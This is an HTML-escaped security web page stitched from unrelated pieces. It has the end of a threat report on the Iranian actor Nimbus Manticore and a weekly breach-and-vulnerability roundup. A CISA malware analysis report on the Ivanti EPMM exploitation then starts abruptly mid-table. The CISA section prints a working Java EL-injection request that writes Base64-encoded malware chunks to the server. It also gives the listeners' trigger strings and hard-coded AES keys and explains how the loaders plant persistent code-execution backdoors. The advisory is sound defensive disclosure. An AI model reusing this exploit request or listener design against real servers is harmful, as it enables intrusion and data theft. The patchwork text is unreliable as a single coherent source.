&lt;p&gt;C2 Infrastructure based on azurewebsites allows the attacker flexibility and redundancy; if one C2 goes down, they can easily set up a new one.&lt;/p&gt;

&lt;p&gt;While Nimbus Manticore consistently targets the Middle East, especially Israel and the UAE, recent operations show increased interest in Western Europe. We found a correlation between the malware delivery websites and the targeted sectors. For example, a fake hiring portal of a telecommunication company will target an employee and organizations in this sector. Our findings point to similar targets in several key sectors: telecommunications, especially&amp;nbsp;&lt;strong&gt;satellite providers,&lt;/strong&gt;&amp;nbsp;defense contractors, aerospace and airlines. These sectors align with the IRGC’s strategic intelligence collection efforts.&lt;/p&gt;

&lt;/div&gt;

&lt;p&gt;The deployment of Minibike samples in June suggests “business as usual”, occurring as it did against the backdrop of the&amp;nbsp;&lt;strong&gt;twelve-day conflict between Israel and Iran&lt;/strong&gt;. The identified samples indicate that Israel was the primary focus at that time.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;In our research, we uncovered the elusive operations of the Iranian threat actor known as&amp;nbsp;&lt;strong&gt;Nimbus Manticore&lt;/strong&gt;. Over the last year, this threat actor adopted a new set of techniques that allowed them to remain under the radar and continue operating even during the twelve-day Israeli-Iranian conflict.&lt;/p&gt;



&lt;p&gt;Nimbus Manticore also expanded its interest in European targets, particularly in the&amp;nbsp;&lt;strong&gt;telecommunications, defense, aerospace, satellite and airline&lt;/strong&gt;&amp;nbsp;sectors. We analyzed the evolution of the Minibike implant, which has incorporated multi-layered obfuscation and increasingly relies on legitimate cloud services to remain stealthy and difficult to detect.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Several major European airports including Heathrow, Berlin, Brussels, Dublin, and Cork have &lt;a href="https://www.reuters.com/en/cyberattack-causes-flight-delays-cancellations-brussels-airport-2025-09-20/"&gt;experienced&lt;/a&gt; a cyber-attack, resulting in disruptions to electronic check-in and baggage drop systems using Collins Aerospace&amp;#8217;s MUSE software. The incident led to flights delays, cancellations, and diversions, with affected airports advising passengers to confirm travel plans.&lt;/li&gt;
&lt;li&gt;Luxury brands Gucci, Balenciaga, and Alexander McQueen were &lt;a href="https://www.bbc.com/news/articles/crl5j8ld615o"&gt;hit&lt;/a&gt; by a data breach that resulted in the theft of personal information of potentially millions of customers worldwide. The stolen data includes names, email addresses, phone numbers, physical addresses, and total amount spent by each customer, but not financial details such as credit card information. The cybercriminal group Scattered Lapsus$ Hunters claimed responsibility for the attack.&lt;/li&gt;
&lt;li&gt;Google has &lt;a href="https://www.bleepingcomputer.com/news/security/google-confirms-fraudulent-account-created-in-law-enforcement-portal/"&gt;confirmed&lt;/a&gt; a cyber attack that resulted in hackers creating a fraudulent account within its Law Enforcement Request System platform, though no official data requests were made and no user data was accessed via the account. The incident raised concerns over potential unauthorized access and impersonation of law enforcement. The attack was claimed by Scattered Lapsus$ Hunters group.&lt;/li&gt;
&lt;li&gt;Hotels in Brazil and other countries have &lt;a href="https://securelist.com/revengehotels-attacks-with-ai-and-venomrat-across-latin-america/117493/"&gt;been&lt;/a&gt; victims of cyber-attacks that resulted in theft of guest payment card data from front-desk systems via phishing-delivered malware. The incidents involved VenomRAT enabling credential theft, remote access, and data exfiltration, impacting travelers’ financial information across multiple regions. The campaign is attributed to the RevengeHotels group, which leveraged LLM-generated code.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check &lt;/em&gt;&lt;em&gt;Point Harmony Endpoint provides protection against this threat &lt;/em&gt;&lt;em&gt;(RAT.Win.Venom;&lt;/em&gt; &lt;em&gt;Loader.Win.Venom)&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Venture capital firm, Insight Partners, has &lt;a href="https://www.securityweek.com/insight-partners-confirms-data-breach-result-of-ransomware-attack/"&gt;been&lt;/a&gt; a victim of a ransomware attack that resulted in data exfiltration and server encryption. The breach impacts 12,657 individuals and includes banking and tax data, personal information of current and former employees, limited partners’ data, as well as fund, management and portfolio information.&lt;/li&gt;
&lt;li&gt;American jewelry company Tiffany&amp;#8217;s has &lt;a href="https://cybersecuritynews.com/tiffany-confirms-data-breach/"&gt;suffered&lt;/a&gt; a data breach that resulted in the theft of customer personal data and gift card details. Attackers gained unauthorized access to company systems, compromising names, postal and email addresses, phone numbers, sales data, internal client reference numbers, as well as gift card numbers and associated PINs.&lt;/li&gt;
&lt;li&gt;SonicWall has &lt;a href="https://www.sonicwall.com/support/knowledge-base/mysonicwall-cloud-backup-file-incident/250915160910330"&gt;disclosed&lt;/a&gt; a security incident involving unauthorized access to cloud-stored firewall backup preference files through brute-force attacks. According to the company, 5% of registered firewalls had their encrypted credential-containing backup files accessed, with information that could ease exploitation of affected devices.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Fortra has &lt;a href="https://www.bleepingcomputer.com/news/security/fortra-warns-of-max-severity-flaw-in-goanywhere-mfts-license-servlet/"&gt;disclosed&lt;/a&gt; maximum severity vulnerability CVE-2025-10035 affecting the License Servlet of Fortra&amp;#8217;s GoAnywhere Managed File Transfer (MFT) software. The flaw results from deserialization of untrusted data, allowing remote, low-complexity command injection if the attacker can forge a valid license response signature. Successful exploitation targets externally exposed admin consoles and could enable unauthorized system access and command execution.&lt;/li&gt;
&lt;li&gt;A critical authentication bypass vulnerability in the Case Theme User WordPress plugin &lt;a href="https://www.wordfence.com/blog/2025/09/attackers-actively-exploiting-critical-vulnerability-in-case-theme-user-plugin/"&gt;allowed&lt;/a&gt; unauthenticated attackers to gain access to arbitrary user accounts, including administrators, by exploiting flaws in the Facebook social login implementation when the target&amp;#8217;s email address is known. Mass exploitation has been observed in the wild with over 20,900 blocked attempts, as the flaw enables attackers to completely compromise vulnerable WordPress sites.&lt;/li&gt;
&lt;li&gt;Google has &lt;a href="https://chromereleases.googleblog.com/2025/09/stable-channel-update-for-desktop_17.html"&gt;released&lt;/a&gt; a security patch addressing 4 vulnerabilities affecting Chrome. Among the vulnerabilities is CVE-2025-10585, a high severity type confusion vulnerability in V8. According to Google, an exploit for the vulnerability already exists in the wild, confirming that it could have potentially been exploited as a zero-day.&lt;/li&gt;

&lt;td&gt;&lt;strong&gt;Executive Summary&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;The Cybersecurity and Infrastructure Security Agency (CISA) obtained two sets of malware from an organization compromised by cyber threat actors exploiting &lt;a href="https://www.cve.org/CVERecord?id=CVE-2025-4427" target="_blank" title="CVE-2025-4427"&gt;CVE-2025-4427&lt;/a&gt; and &lt;a href="https://www.cve.org/CVERecord?id=CVE-2025-4428" target="_blank" title="CVE-2025-4428"&gt;CVE-2025-4428&lt;/a&gt; in Ivanti Endpoint Manager Mobile (Ivanti EPMM). Each set contains loaders for malicious listeners that enable cyber threat actors to run arbitrary code on the compromised server.&amp;nbsp;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Affected Products&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Ivanti EPMM, versions 11.12.0.4 and prior, 12.3.0.1 and prior, 12.4.0.1 and prior, and 12.5.0.0 and prior. (Ivanti provided a patch and disclosed the vulnerabilities on May 13, 2025.)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Key Actions&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Detect activity&lt;/strong&gt; by using the indicators of compromise (IOCs) and detection signatures to identify malware samples.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Prevent compromise&lt;/strong&gt; by upgrading Ivanti EPMM versions to the latest version as soon as possible.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Prevent compromise&lt;/strong&gt; by treating mobile device management (MDM) systems as high-value assets (HVAs) with additional restrictions and monitoring.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;

&lt;td&gt;&lt;strong&gt;Intended Audience&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Organization&lt;/strong&gt;s: All organizations with on-premises Ivanti EPMM systems.&lt;/p&gt;

&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;The Cybersecurity and Infrastructure Security Agency (CISA) obtained two sets of malware, five files in total, from an organization where cyber threat actors exploited CVE-2025-4427 [CWE-288: Authentication Bypass Using an Alternate Path or Channel] and CVE-2025-4428 [CWE-‘Code Injection’] in Ivanti Endpoint Manager Mobile (Ivanti EPMM) deployments for initial access.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Ivanti provided a patch and disclosed the vulnerabilities on May 13, 2025. CISA added both vulnerabilities to its Known Exploited Vulnerabilities Catalog on May 19, 2025.&lt;/p&gt;
&lt;p&gt;Around May 15, 2025, following publication of a proof of concept, the cyber threat actors gained access to the server running EPMM by chaining these vulnerabilities. The cyber threat actors targeted the &lt;code&gt;/mifs/rs/api/v2/&lt;/code&gt; endpoint with HTTP &lt;code&gt;GET&lt;/code&gt; requests and used the &lt;code&gt;?format=&lt;/code&gt; parameter to send malicious remote commands. The commands enabled the threat actors to collect system information, download malicious files, list the root directory, map the network, execute scripts to create a heapdump, and dump Lightweight Directory Access Protocol (LDAP) credentials.&lt;/p&gt;
&lt;p&gt;CISA analyzed two sets of malicious files the cyber threat actors wrote to the &lt;code&gt;/tmp&lt;/code&gt; directory. Each set of malware enabled persistence by allowing the cyber threat actors to inject and run arbitrary code on the compromised server.&lt;/p&gt;
&lt;p&gt;CISA encourages organizations to use the indicators of compromise (IOCs) and detection signatures in this Malware Analysis Report to identify malware samples. If identified, follow the guidance in the &lt;strong&gt;Incident Response&lt;/strong&gt; section of this Malware Analysis Report. Additionally, organizations should ensure they are running the latest version of Ivanti EPMM as soon as possible.&lt;/p&gt;

&lt;h2&gt;&lt;strong&gt;Malware Summary&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;CISA analyzed two sets of malware:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Set 1 consists of the following malicious files: &lt;code&gt;web-install.jar&lt;/code&gt;, &lt;code&gt;ReflectUtil.class&lt;/code&gt;, and &lt;code&gt;SecurityHandlerWanListener.class&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Set 2 consists of the following malicious files: &lt;code&gt;web-install.jar&lt;/code&gt; and &lt;code&gt;WebAndroidAppInstaller.class&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; To distinguish the set 1 malware, named web-install.jar, from the set 2 malware with the same name, hereafter this Malware Analysis Report will refer to:&amp;nbsp;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Set 1’s &lt;code&gt;web-install.jar&lt;/code&gt; as Loader 1.&lt;/li&gt;
&lt;li&gt;Set 2’s &lt;code&gt;web-install.jar&lt;/code&gt; as Loader 2.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Each set contains a loader and malicious listener that enables cyber threat actors to inject and run arbitrary code on the compromised server.&lt;/p&gt;
&lt;p&gt;Set 1 works together in the following ways:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Loader 1&lt;/strong&gt; contains and loads &lt;code&gt;ReflectUtil.class&lt;/code&gt;.
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;&lt;strong&gt;ReflectUtil.class&lt;/strong&gt;&lt;/code&gt; injects and manages &lt;code&gt;SecurityHandlerWanListener&lt;/code&gt; in Apache Tomcat.
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;&lt;strong&gt;SecurityHandlerWanListener.class&lt;/strong&gt;&lt;/code&gt; intercepts specific HTTP requests and processes them to decode and decrypt payloads, which create a new class that cyber threat actors can execute to run arbitrary code.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Set 2 works together in the following ways:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Loader 2&lt;/strong&gt; contains and loads &lt;code&gt;WebAndroidAppInstaller.class&lt;/code&gt; at runtime.
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;&lt;strong&gt;WebAndroidAppInstaller.class&lt;/strong&gt;&lt;/code&gt; intercepts and processes specific HTTP requests, retrieves and decrypts password parameters from the request, defines and loads a new malicious class, encrypts and encodes the new class output, and generates a response with the encrypted output.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;strong&gt;Malware Delivery&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; This advisory uses the &lt;a href="https://attack.mitre.org/versions/v17/matrices/enterprise/" target="_blank" title="MITRE ATT&amp;amp;CK® for Enterprise"&gt;MITRE ATT&amp;amp;CK® for Enterprise&lt;/a&gt; framework, version 17. See &lt;strong&gt;Appendix A: MITRE ATT&amp;amp;CK Techniques&lt;/strong&gt; for a table of the threat actors’ activity mapped to MITRE ATT&amp;amp;CK tactics and techniques.&lt;/p&gt;
&lt;p&gt;The cyber threat actors delivered this malware in segments, splitting Loader 1 and 2 into multiple Base64-encoded segments [&lt;a href="https://attack.mitre.org/versions/v17/techniques/T1027/004/" target="_blank" title="T1027.004"&gt;T1027.004&lt;/a&gt;]. They delivered each segment via separate HTTP &lt;code&gt;GET&lt;/code&gt; requests and then used Java Expression Language (EL) injection to write each chunk and append them together using the append mode (via the true parameter).&lt;/p&gt;
&lt;p&gt;For each loader, the actors’ first &lt;code&gt;GET&lt;/code&gt; request created the file and wrote chunk 1. Their subsequent requests appended chunks to the existing file. Below is an example of the actors’ &lt;code&gt;GET&lt;/code&gt; request.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;"GET /mifs/rs/api/v2/featureusage?format=${"".getClass().forName("java.io.FileOutputStream").getConstructor("".getClass(),&amp;nbsp;"".getClass().forName("[Z").getComponentType()).newInstance("/tmp/web-install.jar", true).write("".getClass().forName("java.util.Base64").getMethod("getDecoder").invoke(null).decode("[BASE64_CHUNK]"))&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This argument creates/appends malware segments to the following file:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.newInstance("/tmp/web-install.jar", true)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;It then writes the following decoded Base64 chunk:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.write("".getClass().forName("java.util.Base64").getMethod("getDecoder").invoke(null).decode("[BASE64_CHUNK]"))&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This technique is used for defense evasion—it enables the malware to evade signature-based detection and size limitations as it is transferred to the system. Holistically, this technique combines chunked encoding for evasion and file append operations for reconstruction.&lt;/p&gt;

&lt;h2&gt;&lt;strong&gt;Malware Functionality&lt;/strong&gt;&lt;/h2&gt;
&lt;h3&gt;Set 1&lt;/h3&gt;
&lt;p&gt;This set of malware contains a loader, a manager, and a malicious listener.&lt;/p&gt;
&lt;h4&gt;Loader 1&lt;/h4&gt;
&lt;p&gt;Loader 1 is a Java Archive (JAR) file that contains [&lt;a href="https://attack.mitre.org/versions/v17/techniques/T1027/009/" target="_blank" title="T1027.009"&gt;T1027.009&lt;/a&gt;] and loads the compiled Java class file &lt;code&gt;ReflectUtil.class&lt;/code&gt; at runtime.&lt;br /&gt;Loader 1 masquerades &lt;code&gt;ReflectUtil.class&lt;/code&gt; as part of the &lt;code&gt;org.apache.http&lt;/code&gt; package [&lt;a href="https://attack.mitre.org/versions/v17/techniques/T1036/" target="_blank" title="T1036"&gt;T1036&lt;/a&gt;]. See &lt;strong&gt;Figure 1&lt;/strong&gt; for &lt;code&gt;ReflectUtil.class&lt;/code&gt;’s hierarchal file path.&lt;/p&gt;



&lt;figure class="c-figure c-figure--image"&gt;
  
  &lt;div class="c-figure__media"&gt;    &lt;img alt="Figure 1 - Loader 1 Internal Structure" height="408" src="https://www.cisa.gov/sites/default/files/styles/large/public/2025-09/Figure%201%20-%20Loader%201%20Internal%20Structure.jpg?itok=_BdnDBSL" width="530" /&gt;



&lt;/div&gt;
      &lt;figcaption class="c-figure__caption"&gt;&lt;em&gt;Figure 1. Loader 1 Internal Structure&amp;nbsp;&lt;/em&gt;&lt;/figcaption&gt;
  &lt;/figure&gt;
&lt;h4&gt;ReflectUtil.class Manager&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;ReflectUtil.class&lt;/code&gt; manipulates Java objects to inject and manage the malicious listener &lt;code&gt;SecurityHandlerWanListener&lt;/code&gt; in Apache Tomcat (which was running on the same compromised server). When executed, the file:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Bypasses Java Development Kit (JDK) module restrictions.&lt;/li&gt;
&lt;li&gt;Iterates objects and their contexts.&lt;/li&gt;
&lt;li&gt;Attempts to load &lt;code&gt;SecurityHandlerWanListener&lt;/code&gt; class in the JUnit environment or framework by using &lt;code&gt;getClassName()&lt;/code&gt; to return the hard-coded string &lt;code&gt;org.junit.SecurityHandlerWanListener&lt;/code&gt; [&lt;a href="https://attack.mitre.org/versions/v17/techniques/T1620/" target="_blank" title="T1620"&gt;T1620&lt;/a&gt;].&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;If &lt;code&gt;SecurityHandlerWanListener&lt;/code&gt; class is not loaded because it is not found when &lt;code&gt;ReflectUtil.class&lt;/code&gt; first executes, &lt;code&gt;ReflectUtil.class&lt;/code&gt; handles the error by using a Base64 string catch block (&lt;strong&gt;Figure 2&lt;/strong&gt;) to Base64 decode, gzip decompress, and load the class &lt;code&gt;SecurityHandlerWanListener&lt;/code&gt;.&lt;/p&gt;



&lt;figure class="c-figure c-figure--image"&gt;
  
  &lt;div class="c-figure__media"&gt;    &lt;img alt="Figure 2 - getBase64String() to Base64 Decode, gzip Decompress, and Load the Class" height="568" src="https://www.cisa.gov/sites/default/files/styles/large/public/2025-09/Figure%202%20-%20getBase64String%28%29%20to%20Base64%20Decode%2C%20gzip%20Decompress%2C%20and%20Load%20the%20Class.jpg?itok=pv2O41-B" width="600" /&gt;



&lt;/div&gt;
      &lt;figcaption class="c-figure__caption"&gt;&lt;em&gt;Figure 2. getBase64String() to Base64 Decode, gzip Decompress, and Load the Class SecurityHandlerWanListener&amp;nbsp;&lt;/em&gt;&lt;/figcaption&gt;
  &lt;/figure&gt;
&lt;p&gt;The Base64 string:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Returns the Base64-encoded and gzip-compressed bytecode of class &lt;code&gt;SecurityHandlerWanListener&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Decodes and decompresses [&lt;a href="https://attack.mitre.org/versions/v17/techniques/T1140/" title="T1140"&gt;T1140&lt;/a&gt;] the class bytecode (see &lt;strong&gt;Figure 3&lt;/strong&gt;) in one of two ways:
&lt;ol&gt;
&lt;li&gt;It first uses &lt;code&gt;sun.misc.BASE64Decoder&lt;/code&gt; to call &lt;code&gt;decodeBuffer&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;If the first attempt fails, it uses &lt;code&gt;java.util.Base64&lt;/code&gt; to call &lt;code&gt;getDecoder&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;



&lt;figure class="c-figure c-figure--image"&gt;
  
  &lt;div class="c-figure__media"&gt;    &lt;img alt="Figure 3 - Java Code Snippet for Decoding a Base64 String" height="243" src="https://www.cisa.gov/sites/default/files/styles/large/public/2025-09/Figure%203%20-%20Java%20Code%20Snippet%20for%20Decoding%20a%20Base64%20String.jpg?itok=70vk8Dkj" width="600" /&gt;



&lt;/div&gt;
      &lt;figcaption class="c-figure__caption"&gt;&lt;em&gt;Figure 3. Java Code Snippet for Decoding a Base64 String&amp;nbsp;&lt;/em&gt;&lt;/figcaption&gt;
  &lt;/figure&gt;
&lt;ol start="3"&gt;
&lt;li&gt;Invokes the &lt;code&gt;defineClass&lt;/code&gt; method of &lt;code&gt;ClassLoader&lt;/code&gt; to load the class from the decompressed bytecode.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Once the class &lt;code&gt;SecurityHandlerWanListener&lt;/code&gt; is loaded, &lt;code&gt;ReflectUtil.class&lt;/code&gt;:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Creates a new instance of the class and returns it as a new listener.&lt;/li&gt;
&lt;li&gt;Retrieves the current list of listeners, adds the new listener to this list, and updates the application's listener list.&lt;/li&gt;
&lt;li&gt;Checks if &lt;code&gt;evilClassName&lt;/code&gt; has already been injected into the application's event listener list to avoid multiple injections or to confirm a previous injection. (CISA has no additional information on the listener &lt;code&gt;evilClassName&lt;/code&gt;.)&lt;/li&gt;
&lt;/ol&gt;
&lt;h4&gt;SecurityHandlerWanListener.class&lt;/h4&gt;
&lt;p&gt;This compiled Java class file is a malicious listener that intercepts specific HTTP requests and processes them to decode and decrypt payloads, which dynamically create and execute a new class.&lt;/p&gt;
&lt;p&gt;The file uses &lt;code&gt;ClassLoader&lt;/code&gt; to set up a custom servlet listener that intercepts HTTP requests [&lt;a href="https://attack.mitre.org/versions/v17/techniques/T1071/001/" target="_blank" title="T1071.001"&gt;T1071.001&lt;/a&gt;] based on String Pass, Header Name, and Header Values. Specifically, when a new HTTP request is received, the servlet listener checks if the request contains the string pass &lt;code&gt;7c6a8867d728c3bb&lt;/code&gt;, Header Name &lt;code&gt;Referer&lt;/code&gt;, and Header Value &lt;code&gt;https://www[.]live.com&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;If the fields match, the file creates a HashMap to store the request, response, and session objects. The file also stores the key &lt;code&gt;7c6a8867d728c3bb&lt;/code&gt; in the session.&lt;/p&gt;
&lt;p&gt;The file then retrieves, decodes, and decrypts the Base64-encoded payload:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The file retrieves the payload by reading a line from request’s input stream (&lt;code&gt;request.getReader().readLine()&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;The file decodes the line using Base64.&lt;/li&gt;
&lt;li&gt;The file decrypts the decoded data using Advanced Encryption Standard (AES) cipher object with the stored key.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The file passes the decrypted data to a method named &lt;code&gt;g&lt;/code&gt;, which defines and creates a new Java class file. Cyber threat actors can execute the class on the device to run arbitrary code.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Potential impact&lt;/strong&gt;: This listener could allow cyber threat actors to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Inject and execute arbitrary code on the server&lt;/strong&gt;, enabling follow-on activity and persistence.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Exfiltrate data&lt;/strong&gt; by intercepting and processing HTTP requests.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;See &lt;strong&gt;Figure 4&lt;/strong&gt; for the relevant listener code snippet.&lt;/p&gt;

&lt;h3&gt;Set 2&lt;/h3&gt;
&lt;p&gt;This set of malware contains a loader and a malicious listener.&lt;/p&gt;
&lt;h4&gt;Loader 2&lt;/h4&gt;
&lt;p&gt;This JAR file contains and loads the compiled Java class file &lt;code&gt;WebAndroidAppInstaller.class&lt;/code&gt; at runtime.&lt;/p&gt;
&lt;p&gt;The JAR file masquerades the class file as part of the &lt;code&gt;com.mobileiron.service&lt;/code&gt; package. See &lt;strong&gt;Figure 5&lt;/strong&gt; for &lt;code&gt;WebAndroidAppInstaller.class&lt;/code&gt;’s hierarchal file path.&lt;/p&gt;



&lt;figure class="c-figure c-figure--image"&gt;
  
  &lt;div class="c-figure__media"&gt;    &lt;img alt="Figure 5 - WebAndroidAppInstaller.class Hierarchical File Path" height="275" src="https://www.cisa.gov/sites/default/files/styles/large/public/2025-09/Figure%205%20-%20WebAndroidAppInstaller.class%20Hierarchical%20File%20Path.jpg?itok=K_coH0pM" width="572" /&gt;



&lt;/div&gt;
      &lt;figcaption class="c-figure__caption"&gt;&lt;em&gt;Figure 5: WebAndroidAppInstaller.class Hierarchical File Path&amp;nbsp;&lt;/em&gt;&lt;/figcaption&gt;
  &lt;/figure&gt;
&lt;h4&gt;WebAndroidAppInstaller.class&lt;/h4&gt;
&lt;p&gt;This compiled Java class file is a malicious listener that intercepts and processes specific HTTP requests, retrieves and decrypts password parameters from the request, defines and loads a new malicious class, encrypts and encodes the new class output, and generates a response with the encrypted output.&lt;/p&gt;
&lt;p&gt;The listener first retrieves request and response objects from a Java &lt;code&gt;ServletContext&lt;/code&gt;. Then, the file checks the request’s &lt;code&gt;Content-Type&lt;/code&gt; to ensure it is not &lt;code&gt;null&lt;/code&gt; and contains the string &lt;code&gt;application/x-www-form-urlencoded&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;If these conditions are met, the file retrieves a password parameter from the request. If the data is not &lt;code&gt;null&lt;/code&gt; and has a length greater than zero, the password parameter value is Base64 decoded and decrypted using an AES algorithm with the hard-coded key &lt;code&gt;3c6e0b8a9c15224a&lt;/code&gt; [&lt;a href="https://attack.mitre.org/versions/v17/techniques/T1573/001/" target="_blank" title="T1573.001"&gt;T1573.001&lt;/a&gt;].&lt;/p&gt;
&lt;p&gt;If the decrypted data is not empty, the decrypted data defines and implements a new class. The file AES encrypts the new class output using the same hard-coded key, &lt;code&gt;3c6e0b8a9c15224a&lt;/code&gt;, and then Base64 encodes it [&lt;a href="https://attack.mitre.org/techniques/T1027/013/" target="_blank" title="T1027.013"&gt;T1027.013&lt;/a&gt;].&lt;/p&gt;
&lt;p&gt;The file then generates a Message Digest Algorithm 5 (MD5) hash of the data stored in the password parameter (from the initial HTTP request) and hard-coded key and checks if the hash value was stored in newly allocated byte array &lt;code&gt;ByteArrayOutputStream&lt;/code&gt;. The file creates a &lt;code&gt;PrintWriter&lt;/code&gt; object to generate a response containing the first 16 characters of the computed MD5 hash value, followed by the Base64-encoded and AES-encrypted output of the new loaded class and the remaining part of the MD5 hash value.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Potential impact.&amp;nbsp;&lt;/strong&gt;This listener could allow cyber threat actors to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Inject and execute arbitrary code on the server,&lt;/strong&gt; enabling follow-on activity and persistence.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Exfiltrate data&amp;nbsp;&lt;/strong&gt;by receiving response and execution results.&lt;/li&gt;
&lt;/ul&gt;

&lt;/table&gt;
&lt;h2&gt;&lt;strong&gt;Incident Response&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;If this or similar malware is detected, CISA recommends that organizations:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Quarantine or take offline potentially affected hosts.&lt;/li&gt;
&lt;li&gt;Collect and review artifacts, such as running processes/services, unusual authentications, and recent network connections.&lt;/li&gt;
&lt;li&gt;Capture a full forensic disk image of the affected host for sharing with CISA.&lt;/li&gt;
&lt;li&gt;If initial investigation (Step 2) finds the threat actor’s access was limited (e.g., they did not move laterally or elevate privileges), provision new account credentials. If the investigation finds the threat actor had broader access or potentially moved laterally, follow your organization’s incident response plans to initiate threat hunting, containment, and eviction measures.&lt;/li&gt;
&lt;li&gt;Report the compromise to CISA:
&lt;ol&gt;
&lt;li&gt;Report the compromise via CISA’s 24/7 Operations Center (&lt;a href="mailto:contact@cisa.dhs.gov" title="contact@cisa.dhs.gov"&gt;contact@cisa.dhs.gov&lt;/a&gt; or 1-844-729-2472) or&amp;nbsp;&lt;a href="https://myservices.cisa.gov/irf" title="CISA's Incident Reporting System"&gt;CISA’s Incident Reporting System&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Use CISA’s &lt;a href="https://www.cisa.gov/resources-tools/services/malware-next-generation-analysis" title="Malware Analysis Submission Form"&gt;Malware Analysis Submission Form&lt;/a&gt; to submit a file containing the malicious code. Include the CISA-provided Incident ID number (obtained from reporting the compromise) in the Open Incident ID field.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Reimage compromised hosts.&lt;/li&gt;
&lt;li&gt;Apply recommendations from the &lt;strong&gt;Mitigations&lt;/strong&gt; section to harden the systems.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;strong&gt;Mitigations&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;CISA recommends organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of the threat actors’ activity. These mitigations align with the &lt;a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals" title="CPGs"&gt;Cross-Sector Cybersecurity Performance Goals (CPGs)&lt;/a&gt; developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s &lt;a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals" title="CPGs"&gt;CPGs webpage&lt;/a&gt; for more information on the CPGs, including additional recommended baseline protections.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Upgrade Ivanti EPMM versions to the latest version&lt;/strong&gt; as soon as possible.&lt;/li&gt;
